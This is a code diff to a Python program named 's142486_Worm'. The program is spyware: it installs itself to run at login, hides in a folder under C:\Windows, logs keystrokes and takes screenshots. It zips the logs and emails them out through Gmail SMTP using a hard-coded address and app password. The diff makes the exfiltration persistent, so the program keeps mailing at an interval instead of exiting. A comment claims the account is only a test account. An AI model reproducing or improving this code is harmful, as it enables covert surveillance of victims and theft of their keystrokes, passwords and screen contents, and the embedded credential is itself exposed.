@@ -34,15 +34,12 @@ hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
 path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
 logs = "C:\\Windows\\s142486_WormFolder" 
 paramsPath = os.path.join(hiddenFolderPath, "Params.json")
+
+# EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 EMAIL = "Rvm855219@gmail.com"
 PASSWORD = "rtpq bdhn pqib rrgk"
-message = MIMEMultipart()
-message["From"] = EMAIL
-message["To"] = EMAIL
-message["Subject"] = os.getlogin()
-message.attach(MIMEText(now.strftime("%d %B, %Y"), "plain"))
 logLock = threading.Lock()
 screenshotCount = 0
 
@@ -52,7 +49,8 @@ def createParamJson():
         "LogKeys" : True,
         "LogScreen" : True,
         "Logging" : True,
-        "EnableKillSwitch" : True   
+        "EnableKillSwitch" : True,
+        "persistentMailInterval" : 120
     }
     
     if not os.path.exists(paramsPath):
@@ -210,7 +208,8 @@ def mailQueue():
         ]
         
         if not zipFiles:
-            break  # alles verstuurd, thread klaar
+            exitEvent.wait(persistentMailInterval)
+            continue
         
         for zipFile in zipFiles:
             if sendSingleMail(zipFile):
@@ -226,7 +225,7 @@ def screenLogger():
         while not exitEvent.is_set():
             screenshotCount += 1
             timestamp = datetime.now().strftime("%H.%M.%S")
-            filename = f"{hiddenFolderPath}\\Logs_{dateTimeFolder}\\ScreenLogs\\Screenlog_{timestamp}.jpg"
+            filename = f"{hiddenFolderPath}\\Logs_{dateTimeFolder}\\ScreenLogs\\Screenlog_{timestamp}_{screenshotCount}.jpg"
             screenshot = pyautogui.screenshot()
             screenshot.save(filename)
             
@@ -255,7 +254,7 @@ def keyLogger():
                 "ctrl droite": " *RIGHT_CTRL* ",
                 "ctrl": " *CTRL* ",
                 "maj": " *SHIFT* ",
-                "right shift": " RIGHT_SHIFT* ",
+                "right shift": " *RIGHT_SHIFT* ",
                 "verr.maj": " *SHIFT_LOCK* ",
                 "tab": " *TAB* ",
                 "haut": " *ARROW_UP* ",
@@ -302,23 +301,29 @@ def killSwitch():
         keyboard.wait("ctrl+alt+k")
         exitEvent.set()
     
-runOnLogin("s142486_Worm", scriptPath)
-makeStructure()
-copyScript(hiddenFolderPath)
-createParamJson()
-zipAllPrevSessions(hiddenFolderPath)
 
-keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
-screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
-kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")
-mail_thread = threading.Thread(target=mailQueue, name="MailQueue", daemon=True)
+if __name__ == "__main__":
+    try:    
+        runOnLogin("s142486_Worm", scriptPath)
+        makeStructure()
+        copyScript(hiddenFolderPath)
+        createParamJson()
+        zipAllPrevSessions(hiddenFolderPath)
 
-keyLog_thread.start()
-screenLog_thread.start()
-kill_thread.start()
-mail_thread.start()
+        keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
+        screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
+        kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")
+        mail_thread = threading.Thread(target=mailQueue, name="MailQueue", daemon=True)
 
-keyLog_thread.join()
-screenLog_thread.join()
-kill_thread.join()
-mail_thread.join()
+        keyLog_thread.start()
+        screenLog_thread.start()
+        kill_thread.start()
+        mail_thread.start()
+
+        keyLog_thread.join()
+        screenLog_thread.join()
+        kill_thread.join()
+        
+    except Exception as e:
+        with open(os.path.join(hiddenFolderPath, "error.log"), 'a') as f:
+            f.write(f"{datetime.now()} | FATAL: {e}\n")
